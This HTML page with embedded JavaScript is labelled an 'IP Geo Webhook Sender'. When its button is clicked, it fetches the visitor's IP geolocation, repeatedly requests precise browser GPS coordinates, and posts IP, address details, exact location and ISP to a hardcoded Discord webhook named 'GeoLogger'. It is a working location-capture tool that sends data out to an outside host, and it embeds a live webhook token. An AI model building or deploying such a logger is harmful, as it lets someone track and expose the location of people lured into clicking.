<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Geo Webhook Sender</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        #status { margin-top: 20px; padding: 10px; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <h1>Click to Send Your IP Geo Info</h1>
    <p>This will detect your IP, fetch geo details, and send them to the webhook.</p>
    <button onclick="sendGeoToWebhook()">Send Geo Info</button>
    <div id="status"></div>
<script>
    async function sendGeoToWebhook() {
        const statusEl = document.getElementById('status');
        statusEl.innerHTML = 'Fetching your IP geo info...';
        statusEl.className = '';

        try {
            // Step 1: Fetch geo data
            const apiResponse = await fetch('http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,zip,lat,lon,timezone,isp,org,query');
            const geoData = await apiResponse.json();

            if (geoData.status !== 'success') {
                throw new Error(geoData.message || 'Failed to fetch geo data');
            }

            // Step 2: Try to get exact GPS location with retries
            let gpsLocation = `${geoData.lat}, ${geoData.lon}`; // Fallback to IP-based coordinates
            let gpsError = null;
            const maxRetries = 3;
            for (let attempt = 1; attempt <= maxRetries; attempt++) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    gpsLocation = `${position.coords.latitude}, ${position.coords.longitude}`;
                    break; // Success, exit retry loop
                } catch (error) {
                    gpsError = error;
                    console.warn(`GPS attempt ${attempt} failed: ${error.message}`);
                    if (attempt === maxRetries) {
                        console.error('All GPS attempts failed, using IP-based coordinates');
                        statusEl.innerHTML = '‚ö†Ô∏è GPS unavailable, using approximate IP-based location.';
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1s before retry
                }
            }

            // Provide specific error message for GPS failure
            if (gpsError) {
                if (gpsError.code === gpsError.PERMISSION_DENIED) {
                    statusEl.innerHTML = '‚ö†Ô∏è Location access denied, using IP-based location.';
                } else if (gpsError.code === gpsError.POSITION_UNAVAILABLE) {
                    statusEl.innerHTML = '‚ö†Ô∏è Location unavailable, using IP-based location.';
                } else if (gpsError.code === gpsError.TIMEOUT) {
                    statusEl.innerHTML = '‚ö†Ô∏è Location request timed out, using IP-based location.';
                }
            }

            // Step 3: Prepare message for Discord
            const payload = {
                username: "GeoLogger",
                content: `üåç **New Geo Info Captured**\n
**IP:** ${geoData.query}
**Country:** ${geoData.country}
**Region:** ${geoData.regionName}
**City:** ${geoData.city}
**ZIP:** ${geoData.zip}
**Lat/Lon:** ${geoData.lat}, ${geoData.lon}
**Exact GPS Location:** ${gpsLocation}
**Timezone:** ${geoData.timezone}
**ISP:** ${geoData.isp}
**Org:** ${geoData.org}
‚è∞ **Timestamp:** ${new Date().toISOString()}`
            };

            // Step 4: Send to Discord webhook
            const webhookUrl = 'https://discord.com/api/webhooks/1411086092026777742/60wVbPvrvNubv9vpZaHbAFXf3HsYBxB-VjDEduG-Qj_6KFOPhKyRj6jtIah_4MqlkEJg';
            const webhookResponse = await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (webhookResponse.ok) {
                statusEl.innerHTML = '‚úÖ Success! Geo info sent to webhook.';
                statusEl.className = 'success';
            } else {
                throw new Error(`Webhook error: ${webhookResponse.status}`);
            }
        } catch (error) {
            statusEl.innerHTML = `‚ùå Error: ${error.message}`;
            statusEl.className = 'error';
        }
    }
</script>
</body>
</html>
